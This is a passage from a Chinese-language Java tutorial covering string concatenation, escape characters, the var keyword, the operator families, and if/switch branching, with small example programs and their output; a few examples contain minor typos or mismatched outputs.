</blockquote>
<p>**　　需要注意的是，每一个字符串实际上都可以进行内容的连接，而内容的连接，可以通过“+”来实现（不是数字的加法而表述的是一个连接操作）**</p>
<p><strong>范例：字符串连接操作</strong><br>        public class DongJun{<br>            static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>            public static void main(String DongJun[]){<br>                String message = “姓名：”;<br>                message =  “我的” + message ;<br>                System.out.println(message+”董俊”);</p>
<pre><code>    }
}</code></pre><p>　　<em>既然在字符串之中“+”属于连接的操作形式，所以这个时候就会存在有另外一个问题：如果现在直接与其他基本数据类型进行连接又会如何呢？</em></p>
<p><strong>范例：观察基本数据类型与字符串的连接</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String prompt = &quot;数据输出&quot;;
        System.out.println(prompt + 1);
        System.out.println(prompt + 1.1);
        System.out.println(prompt + &apos;Y&apos;);
        System.out.println(prompt + true);


    }
}</code></pre><blockquote>
</blockquote>
<p>数据输出1<br>数据输出1.1<br>数据输出Y（字符并没有变为数字，而是直接使用了原始的字符内容）<br>数据输出true</p>
<p><strong>以上仅仅是连接了一些基本数据型常量，那么如果说现在连接的是一些基本的计算表达式，那么请继续观察程序问题。</strong></p>
<p><em>范例：观察计算表达式问题</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        double num_a = 9.5 ;
        int num_b  = 3 ;
        System.out.println(&quot;数学计算:&quot;+num_a + num_b);
    }
}</code></pre><blockquote>
<p>数学计算：9.53（字符串连接）</p>
</blockquote>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        double num_a = 9.5 ;
        int num_b  = 3 ;
        System.out.println(&quot;数学计算:&quot;+(num_a + num_b));
    }
}</code></pre><blockquote>
<p>数学计算:12.5（先数学计算再连接）</p>
</blockquote>
<p>**　　之所以此时要强调这种问题的关键在于，在进行字符串处理的时候“+”和数学计算的“+”会有那么一些麻烦的表述，当java任何的数据类型与字符串进行连接的似乎还，所有的数据类型会首先变为字符串，按照此时的代码，首先执行的是“字符串+double变量”，自动转为String的字符串，而后这个字符串再通过“+”连接一个整型，这个时候的整型也会自动转为字符串，所以最终的计算就称为了一个字符串的连接操作，而加上了括号之后表示要先计算括号内部的数据加法（double类型），最后再与字符串进行连接操作（double自动转为了String）但是这些操作仅仅是发生在包含有“+”的概念上，如果使用的是其他的运算，例如使用的是“-”，那么该程序在编译的时候就会出错**</p>
<pre><code>另外需要提醒大家的是，在进行字符串定义的时候本身如果包含有一些特殊的内容肯定是无法直接定义的，所以在这样的情况下要想描述一些特殊标记的符号就要使用转义字符，常见的转义字符为：双引号（&quot;、“\&quot;”）、单引号（&apos;、“\&apos;”）、换行符(“\n”)、制表符（“\t”）。</code></pre><p><em>范例：观察转义字符</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String message = &quot;董俊\&quot;\n\\\t我的填&quot;;
        System.out.println(message);
    }
}</code></pre><p><strong>这些转义字符也就在基础学习的过程之中有些作用，主要可以让内容的输出更加好看一些，但是如果在实际上的开发里面用处不是特别大</strong></p>
<h1 id="var关键字"><a href="#var关键字" class="headerlink" title="var关键字"></a>var关键字</h1><pre><code>Java 本身属于一门静态变成语言，在进行各个变量定义的时候就必须明确的声明变量的类型以及变量的具体内容（JDK1.5之后的版本要求是在使用之前复制），但是随着当今时代编程语言的技术发展，对于编程语言的要求也开始变得更多，所以这个时候很多的语言就退出了一个所谓的推断式变量定义，后来java在JDK1.10版本之中正式引入了此机制，所以提供了一个新的var关键字，这个关键字主要用于进行变量的定义，并且会根据所赋予的内容进行自动类型的配置。</code></pre><p><strong>范例：观察var关键字的使用</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        var num_a = 10.2 ;//将自动推断num_a类型为double
        var num_b = 3 ;//将自动推断num_b类型为int
        System.out.println(num_a - num_b);

    }
}</code></pre><blockquote>
<p>7.199999999999999(这种精度问题可以忽略)</p>
</blockquote>
<pre><code>public class DongJun{ 
static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
public static void main(String DongJun[]){
    var num_a = 10.2 ;//将自动推断num_a类型为double
    var num_b = 3 ;//将自动推断num_b类型为int
    System.out.println(((Object)num_b).getClass());//class java.lang.Integer
    System.out.println(((Object)num_a).getClass());//class java.lang.Double

}
}</code></pre><p>**　　在使用var关键字的时候除了可以为其赋值为基本数据类型之外，也可以设置字符串变量。**</p>
<p>范例：定义字符串变量</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        var message  = &quot;董俊&quot;;
        System.out.println(message);

    }
}</code></pre><blockquote>
<p>董俊</p>
</blockquote>
<p>**　　于是这个时候就有人提出疑问了，按照现在的做法，感觉所有的变量都使用var定义实际上减少了我们对于关键字的记忆需求，为什么你又在这边强调不要去使用它呢？**</p>
<pre><code>个人总结两个缺点：
    缺点一：像传统C、C++、Java这样编程语言对于数据类型都是有非常严格的要求，所以其对应的数据类型如果写的非常明确，那么就适合于程序的编写与调试，而如果使用var直接定义，那么类型不明确，于是世界上有一种变量的声明格式采用的是加入数据类型的模式完成例如：“var double_num_a = 10.2;”

    缺点二：其他语言的var是真正的动态类型（随时可以改变变量所保存的数类型的），而Java之中只是提供了一个var样子而已（一旦定义了变量，并且已经推断出了类型之后，那么该变量所保存的类型不允许改变）。</code></pre><p><em>范例：错误的var操作</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        var num = 10.2;
        num = &quot;www.yootk.com&quot;;</code></pre><p>​<br>​        }<br>​    }</p>
<blockquote>
</blockquote>
<p>DongJun.java:5: 错误: 不兼容的类型: String无法转换为double<br>                num = “<a href="http://www.yootk.com&quot;" target="_blank" rel="noopener">www.yootk.com&quot;</a>;<br>                      ^<br>1 个错误<br>错误: 编译失败</p>
<p><strong>综合以上的结论来讲，var关键字这种所谓的数据类型推断于实际的开发意义确实不是很大，这种操作尽量慎用</strong></p>
<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><pre><code>编程语言的本质是在于数学的计算（包括整个计算机的组成都是依据数学公式“冯诺依曼”），如果我们现在的程序开发使用的还是低级语言（汇编语言），那么所有的开发者就必须进行大量的细节处理，计算机的基本组成为二进制的数据，所以对于正数、负数、小数都需要进行各种二进制的计算转换，才可以通过计算机进行处理，但是如果所有的开发代码都还保持着这些低级语言的开发环境，那么对于技术的发展是非常不利的。</code></pre><blockquote>
<p><strong>放低思维：在国内的互联网的历史上，百度肯定是作为一家搜索引擎的公司出现的，他自己有自己的开发技术，但是在早期的互联网时代之中，实际上为了便于上网出现了所谓的导航网站（早期的Yahoo）。</strong><br><strong>在国内的“hao123.com”，本身没有任何的技术难度，所以在这样的情况下，许多的初级网民就觉得非常好用，于是最终2000W卖给了百度.</strong></p>
</blockquote>
<p>*　　如果所有的程序中的数学计算都要求每一位开发者进行所有底层的处理转换，那么计算机的发展肯定无法前进，那么作为高级编程语言（C、C++、JAVA、Python等），就必须读这些数学计算进行一系列的简化处理，所以才提出了所谓的运算符的概念，通过各种运算符以及编译操作过程就可以简化所有的计算处理。*</p>
<pre><code>通过之前的学习实际上以及接触了两类运算符：
    |-赋值运算符：变量 = 内容（数据）、 变量 = 其他变量；
    |-数学运算符：+、-、*、/;
而除了以上可以见到的运算符之外，在Java程序之中依然还包括有许多的运算符，那么这些运算符基本的使用过程实际上和正常生活的数学逻辑是非常贴近的。</code></pre><p>**　　重要的运算符：四则运算、逻辑运算（大小关系）、三目运算、自增或自减运算，除了这些基本的运算符之外，实际上所有的运算符都有其运算优先级（先乘除后加减）**</p>
<p><strong>高手的编程</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int a = 10;
        int b = 20;
        int result = a++ - b++ * a - b-- /  ++b * ++a;
        System.out.println(result);

    }
}</code></pre><blockquote>
<p>-222(不要问为什么)</p>
</blockquote>
<pre><code>在你以后的开发生涯之中，如果你真的写出了这样代码，接手你代码的后续的开发者一定会跑路。

随着开发产业的不断发展，那么所谓的优秀的代码大部分都会有一种固定的特征：“全部编写简单按程序”，所有的代码可以像“1+1= 2”那样简单。</code></pre><h1 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h1><pre><code>数学运算符是整个运算符之中最接近于原生生活的一种运算符，利用数学运算符可以方便的实现四则运算（加、减、乘、除、模），除了标配的运算符之外还提供有简化运算符。

模（MOD）：在实际的项目开发过程里面，求模的意义可以实现数的批量控制，例如：每20个人站为一组</code></pre><p>范例：通过求模的方式进行批量处理</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int currentNumber  = 20 ; //定义变量
        int result = currentNumber % 20; // 如果先currentNuumber不是20，则模的结果一定不是0
        System.out.println(&quot;运算结果：&quot;+result);

    }
}</code></pre><blockquote>
<p>运算结果： 0</p>
</blockquote>
<pre><code>对于求模的操作可能比较接近于当前基础环境的就只有一个常用的功能了：判断奇偶数（奇数模2为1，偶数模2为0）</code></pre><p><strong>实现奇偶数判断</strong></p>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写<br>        //Java中类的定义规则：每一个单词的首字母必须大写<br>        int number =  3; // 定义变量<br>        int result   = number % 2 ;<br>        System.out.println(“运算结果：”+result);<br>    }<br>}</p>
<blockquote>
<p>运算结果：1（现在判断的数字是一个奇数）</p>
</blockquote>
<p><strong>范例：简化运算符</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int numberA =  33; // 定义变量
        int numberB =  33; // 定义变量
        int numberC =  33; // 定义变量
        int numberD =  33; // 定义变量
        int numberE =  33; // 定义变量
        numberA += 5;
        numberB -= 5;
        numberC *= 5;
        numberD /= 5;
        numberE %= 5;
        System.out.println(&quot;运算结果A：&quot;+numberA);
        System.out.println(&quot;运算结果B：&quot;+numberB);
        System.out.println(&quot;运算结果C：&quot;+numberC);
        System.out.println(&quot;运算结果D：&quot;+numberD);
        System.out.println(&quot;运算结果E：&quot;+numberE);
    }
}</code></pre><blockquote>
</blockquote>
<p>运算结果A：38<br>运算结果B：28<br>运算结果C：165<br>运算结果D：6<br>运算结果E：3</p>
<h1 id="自增与自减运算符"><a href="#自增与自减运算符" class="headerlink" title="自增与自减运算符"></a>自增与自减运算符</h1><pre><code>在Java运算符里面针对于数学运算提供有“++”（自增运算，每一次调用内容都会“+1”处理）、“--”（自减运算，每一次调用内容都会“-1”处理），那么首先先来观察一下这两个运算符的基本使用。</code></pre><p><strong>范例：使用自增</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int num = 10 ; 
        System.out.println(&quot;原始num变量内容:&quot; + num);
        num++;//num+ = 1，但是性能要更高
        System.out.println(&quot;自增后num变量内容:&quot; + num);
    }
}</code></pre><blockquote>
</blockquote>
<p>原始num变量内容:10<br>自增后num变量内容:11</p>
<p>**　　当执行了自增操作之后，原始内容会增加1**<br>以上见到的自增是我们在实际开发中最为推荐的操作方法，但是对于当前自增或者是自减运算又会根据位置的不同而有所不同，主要是发生在执行顺序上。</p>
<pre><code>自增
&quot;变量 ++&quot;：先计算后累加
&quot;== 变量&quot;：先自增再计算
自减
&quot;变量 --&quot;：先计算后自减
&quot;-- 变量&quot;：先自减再计算</code></pre><p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写<br>        //Java中类的定义规则：每一个单词的首字母必须大写<br>        int numA = 10;<br>        int numB = 5;<br>        int result = numA + numB++;<br>        System.out.println(“计算结果:” + result);<br>        System.out.println(“numA=” + numA + “、numB=”+ numB);<br>    }<br>}</p>
<blockquote>
<p>计算结果:15<br>numA=10、numB=6</p>
</blockquote>
<p><strong>以上就实现了自增和自减</strong></p>
<h1 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h1><pre><code>在程序设计之中对于数据的关系基本上就是：&gt;, &lt;, &gt;=, &lt;=, （不等于）!=, （等于）==
这些关系运算符可以直接应用在数值的描述上（字符本身也是可以与整数进行自动转换，所以字符上也可以使用。）</code></pre><p><strong>范例：比较两个数字的大小关系</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int zsAge =  10 ;
        int lsAge =  20 ;
        boolean result = zsAge &gt; lsAge;
        System.out.println(result);
    }
}</code></pre><blockquote>
<p>False</p>
</blockquote>
<p><em>所有的关系运算符计算完成之后的数据类型是布尔类型（它的取值范围（True、False））</em></p>
<p><strong>范例：实现浮点型数据比较</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int zsAge =  10 ;
        int lsAge =  20 ;
        boolean result = zsAge &gt; lsAge;
        System.out.println(result);
    }
}</code></pre><blockquote>
<p>true</p>
</blockquote>
<p>**　　直接利用数值的比较是在进行关系运算符处理过程之中最为常见的数据类型，但是千万不要忘记了，由于java程序本身使用了十六进制的UNICODE编码，所以所有的字符内容都可以转为十进制数字。**</p>
<p><strong>范例：字符和整数进行比较</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        char name = &apos;董&apos;;//中文都是有编码
        System.out.println(name == 33891);

    }
}</code></pre><blockquote>
<p>true</p>
</blockquote>
<pre><code>不同的数据类型彼此发生数据大小比较之后一定要发生转型问题，如果转型失败（这种明面上的数据类型，如果真有转型失败的问题，那么编译器会直接告诉使用者可能出现的语法错误）那么一定无法进行比较，所以本次字符一定是首先自动的转为整型，而后利用整型数值进行相等的判断。</code></pre><p><strong>范例：布尔型的相等和不等判断</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        boolean flagA = true;
        boolean flagB = false;
        System.out.println(flagA == flagB);
        System.out.println(flagA != flagB);

    }
}</code></pre><blockquote>
</blockquote>
<p>false<br>true</p>
<pre><code>由于布尔数据类型的取值范围的定义，所以在使用关系运算符进行布尔数据类型判断的时候，只能够使用相等和不等两个运算符。，而其他的关系运算符将无法使用。</code></pre><h1 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h1><pre><code>如果同学们仅仅是在基础课程的学习过程之中实际上是很难感受到三木运算符的优势（在日后进行代码开发的过程里面，三目运算符相当的好用，同时可以帮助所有的人解决许多的代码冗余的问题）。
|- 三目运算符的本质相当于是一个带有判断的赋值运算符， 传统的赋值运算符能够设置的内容基本上就是变量或者常量，它采用都是比较直白的模式</code></pre><p>**　　如果某些值需要有条件的进行赋予则就必须进行一些关系运算符的判断处理了，当符合于某些判断条件的时候赋值，如果不符合赋予另外一个数值，而这个过程就属于三目运算符的操作，该操作的基本语法形式如下。**</p>
<pre><code>语法形式：[数据类型] 变量 = 判断条件 ? 条件满足时复制内容：条件不满足时赋值内容;</code></pre><p><strong>范例：观察三目运算符的使用</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int ageA = 10;
        int ageB = 15;
        int maxAge = ageA &gt; ageB ? ageA : ageB;
        System.out.println(maxAge);
    }
}</code></pre><blockquote>
<p>15</p>
</blockquote>
<blockquote>
<p><strong>对于此时的三目运算符相当于使用了一个if分支语句进行判断处理操作。</strong></p>
</blockquote>
<p><em>范例：三目等价于if、else判断</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int ageA = 10;
        int ageB = 15;
        int maxAge = 0;
        if (ageA &gt; ageB)
        {
            maxAge  = ageA;
        }
        else {
            maxAge  = ageB;
        }
        System.out.println(maxAge);
    }
}</code></pre><blockquote>
<p>最终输出结果同上</p>
</blockquote>
<pre><code>实际上在所有的运算符使用的过程之中都是可能存在有嵌套关系的，下面实现一个三目运算的嵌套处理。</code></pre><p><em>范例：实现三目运算的嵌套</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int ageA = 10;
        int ageB = 15;
        int ageC = 18;
        int maxAge = ageA &gt; ageB ? ageA : ageB &gt; ageC ? ageB : ageC ;
        System.out.println(maxAge);

    }
}</code></pre><blockquote>
<p>18</p>
</blockquote>
<p>**　　对于此时的程序的操作结构实际上是不便于阅读的，提倡编写简单代码。**</p>
<h1 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h1><pre><code>逻辑运算主要描述的是与或非这样的基本关系，使用逻辑运算符最终的特点在于可以同时连接多个判断条件。
例如：在之前使用的关系运算符，每一次只能够进行一个条件的判断，这样的操作一定不适合于更加复杂的程序逻辑。

逻辑运算符
----------------------------------------------------------
|-与（&amp;普通与和&amp;&amp;短路与）：若干个判断条件同时为true，最终程序结果才是true;
|-或：(|普通或||短路或)若干个判断条件有一个为true，最终程序运算的结果就是true;
|-非：（！）true变为false、false变true。
---------------------------------------------------------------------------------</code></pre><p>**　在给出的逻辑运算符之中非运算的理解可以说是最简单的了，因为仅仅是进行了布尔求反而已**</p>
<p><em>范例：观察与逻辑</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        int x = 1;
        int y = 1;
        System.out.println(x == y &amp; 2 &gt; 1);
        System.out.println(x == y &amp; 2 &lt; 1);


    }
}</code></pre><blockquote>
</blockquote>
<p>true<br>false</p>
<p>**　　与的概念虽然很好理解，但是在java里面却针对于逻辑操作提供有两种不同的运算“&amp;”、“&amp;&amp;”，那么这两种运算有什么区别呢。**</p>
<p>范例：观察普通与存在的问题</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        // 按照高等数学的逻辑来理解“数字/0 = 无求大（计算机的设计来讲无求大意味着内存占满）”
        System.out.println((1 &gt; 2) &amp; 10 / 0 ==0);



    }
}</code></pre><blockquote>
</blockquote>
<p>Exception in thread “main” java.lang.ArithmeticException: / by zero<br>        at DongJun.main(DongJun.java:7)</p>
<p>*这个时候的程序出错实际上意味着所有的判断条件都执行了，但是现在来分析一个问题：对于与操作的逻辑来讲，最大的特点是若干个判断条件如果有一个条件为False，那么最终的与逻辑的结果全部为false（中间出现多少个true都没有意义了）。 *</p>
<pre><code>如果现在使用的是“&amp;”操作意味要全部判断
想要解决程序逻辑判断的性能问题，最佳做法就是使用短路与进行操作。</code></pre><p><strong>范例：短路与进行操作</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        // 按照高等数学的逻辑来理解“数字/0 = 无求大（计算机的设计来讲无求大意味着内存占满）”
        System.out.println((1 &gt; 2) &amp;&amp; 10 / 0 ==0);
        //第一个判断条件（1&gt;2）结果为false，后面的判断没有意义了直接停止判断，返回false




    }
}</code></pre><blockquote>
<p>false</p>
</blockquote>
<p><strong>范例：观察普通或</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        // 按照高等数学的逻辑来理解“数字/0 = 无求大（计算机的设计来讲无求大意味着内存占满）”
        System.out.println((1 == 2) | (10 / 0 ==0));
        //第一个判断条件（1&gt;2）结果为false，后面的判断没有意义了直接停止判断，返回false




    }
}</code></pre><blockquote>
</blockquote>
<p>Exception in thread “main” java.lang.ArithmeticException: / by zero<br>        at DongJun.main(DongJun.java:7)</p>
<p><em>范例：使用短路或</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        // 此时的变量的定义规则为：第一个单词的字母全部小写，随后每一个单子的首字母大写
        //Java中类的定义规则：每一个单词的首字母必须大写
        // 按照高等数学的逻辑来理解“数字/0 = 无求大（计算机的设计来讲无求大意味着内存占满）”
        System.out.println((1 == 1) || (10 / 0 ==0));
        //第一个判断条件（1&gt;2）结果为false，后面的判断没有意义了直接停止判断，返回false




    }
}</code></pre><blockquote>
<p>true</p>
</blockquote>
<pre><code>经过以上分析可以得到一个结论，考虑到执行性能的问题，一定要使用短路与、短路或进行若干操作。</code></pre><h1 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h1><pre><code>为了提升程序的数据处理性能，在任何的语言里面都提供有位运算符，在很多的项目开发之中一般的开发人员很难见到位运算具体的操作（大部分的位运算都出现在一些比较底层的开发过程之中），java中支持的位运算的类型有：&amp;（位与）、|（位或）、^（异或）、~（反码）、&lt;&lt;（左移）、&gt;&gt;（右移）、&gt;&gt;&gt;（无符号右移）。

如果要想使用位运算，处理的逻辑为：数字除2取余，一直除0为止，最后将所有的余数倒叙取出，下面来分析一下如何将十进制的13数字转为二进制。

面试题：请解释“&amp;”和“&amp;&amp;”的区别？
    - 对于“&amp;&amp;”主要应用在逻辑运算中，表示短路与操作，在进行若干个条件判断的时候，如果有条件返回了false，那么后续的条件都不判断，最终的判断的结果就是false；
    - 对于“&amp;”有两种使用环境：
        |- 逻辑运算：表示所有的判断条件都会执行，不管是否遇见有返回false的判断条件；
        |- 位运算：表示进行位与的计算，如果两位的内容都是1结果才是1，如果有一位是0，那么位与的结果就是0；</code></pre><h1 id="程序的逻辑结构"><a href="#程序的逻辑结构" class="headerlink" title="程序的逻辑结构"></a>程序的逻辑结构</h1><pre><code>|- 实际上程序本身是有自己完善的逻辑性，而且从程序设计角度来讲，程序的逻辑一共分为三种逻辑：顺序结构、分支结构、循环结构。
|- 在面对程序的时候后我们就相当于“程序的上帝”，你规定了某一个程序的功能，某一个程序的处理的逻辑，所谓的程序逻辑就相当于通过自己的想法，为程序规划路线。</code></pre><h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><pre><code>所有的程序都有可能根据一些内容动态的判断是否要执行某些代码，这样的处理逻辑就称为分支逻辑，在程序的开发之中分支逻辑分为两种类型：if分支（逻辑条件判断）、switch开关语句（数值判断）。</code></pre><h2 id="if-分支结构"><a href="#if-分支结构" class="headerlink" title="if 分支结构"></a>if 分支结构</h2><pre><code>if如果直接翻译为中文的话为“如果”的含义，在使用if语句进行判断的会说话必须判断是布尔型的处理结构，针对if语句有如下是那种操作结构：
|- if (布尔表达式) { 
    当布尔表达式成立时执行语句
}

|- if (布尔表达式) { 
    当布尔表达式成立时执行语句
} else {
    条件不满足时执行语句
}

|- if (布尔表达式) { 
    当布尔表达式成立时执行语句
} else if (布尔表达式){
    当布尔表达式成立时执行语句
}……else{
    条件不满足执行
}</code></pre><p><strong>范例：学生成绩分支</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        double score = 190.00 ;
        if (score &gt;= 90.00 &amp;&amp; score &lt;= 100)
        { 
            System.out.println(&quot;优等生&quot;);
        } else if (score &gt;= 60 &amp;&amp; score &lt; 90)
        {
            System.out.println(&quot;良等生&quot;);
        } else {
            System.out.println(&quot;差等生&quot;);
        }
    }
}</code></pre><h2 id="Switch-开关语句"><a href="#Switch-开关语句" class="headerlink" title="Switch 开关语句"></a>Switch 开关语句</h2><pre><code>Switch是一个开关语句，在switch之中它能够判断的数据类型仅仅是：整数、字符、JDK1.5之后追加了枚举，JDK1.7之后追加了String的判断支持，如果要想使用switch必须结合case、default（不是必须）来一起使用，其基本的语法结构如下
|- switch (整数|字符|枚举|String){
    case 匹配内容：
        内容满足时执行的语句;
        [break ;]}
    case 匹配内容:{
        内容满足时执行的语句;
        [break ;]},……[
    default:{
        内容都不满足时执行;
        [break ;]}
    ]
    }</code></pre><p><strong>对于switch来讲，它无法像if语句那样使用逻辑表达式进行判断，仅仅支持数值操作</strong></p>
<p><em>范例：观察switch语句</em></p>
<p>public class DongJun{<br>    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>    public static void main(String DongJun[]){<br>        int ch = 3;<br>        switch(ch) {<br>            case 1:<br>                System.out.println(“【1】匹配的数字1”);<br>                break ;<br>            case 2:<br>                System.out.println(“【2】匹配的数字2”);<br>                break;<br>            default:<br>                System.out.println(“【NO】无法匹配内容”);<br>                break;</p>
<pre><code>        }
}</code></pre><p>}</p>
<blockquote>
<p>【NO】无法匹配内容</p>
</blockquote>
<blockquote>
<p><em>*　　以上的程序的处理结构是在实际的开发之中使用switch最为常见的结构形式，但是在使用的过程之中，也有可能出现一些认识上的问题，导致最终程序的执行结果与预期有所差别，下面针对于switch中出现一些情况进行说明。**<br>*|- 在编写switch语句的过程之中每一次case语句中都会包含一个“break”，这个语句的含义是阻止其他功能执行</em><br><em>|- 不一定按照顺序来写case</em><br><em>|- 在早期的switch语句结构之外，除了数字之外最主要的支持就是字符了，（因为字符可以和整型自动互相转换）</em></p>
</blockquote>
<pre><code>在JDK1.7之后（是Oracle收购SUN之后的第一个版本）支持有String的判断，但是仅仅是进行完整的判断。</code></pre><p><strong>范例：在switch语句中使用String</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String message = &quot;我&quot;;
        switch(message){
            case &quot;Dong&quot;:
                    System.out.println(message+&quot;Jun&quot;);
                    break;
            case &quot;董&quot;:
                    System.out.println(message+&quot;俊&quot;);
                    break;
            default:
                    System.out.println(&quot;请输入正确的姓名&quot;);
                    break;

            }
    }
}</code></pre><blockquote>
<p>这种字符串与switch结合匹配主要使用的形式是全匹配。</p>
</blockquote>
<h1 id="yield-关键字"><a href="#yield-关键字" class="headerlink" title="yield 关键字"></a>yield 关键字</h1><pre><code>yield是在JDK13之后正式加入到java中的新关键字，这个关键字的主要作用是进行内容的局部返回，现阶段其主要的设计是结合switch语句来使用，下面在正式的讲解yield之前首先观察一个程序</code></pre><p><strong>范例：观察switch分支</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        String data = &quot;one&quot;;
        int result = 0 ;
        switch (data){
            case &quot;one&quot;:
                result = 1;
                break;
            case &quot;two&quot;:
                result = 2;
                break;
            default:
                result = -1;
                break;
        }
        System.out.println(result);


    }
}</code></pre><blockquote>
<p>1</p>
</blockquote>
<blockquote>
<p>*　本程序的核心含义是通过switch的判断来最终决定result变量内容是什么，以上的程序开发是属于传统的做法，而传统的做法现在就觉得有些啰嗦，如果可以直接在switch里面返回数据该多好呢？*</p>
</blockquote>
<p><strong>范例：观察JDK13之后的新结构</strong></p>
<pre><code>public class DongJun{ 
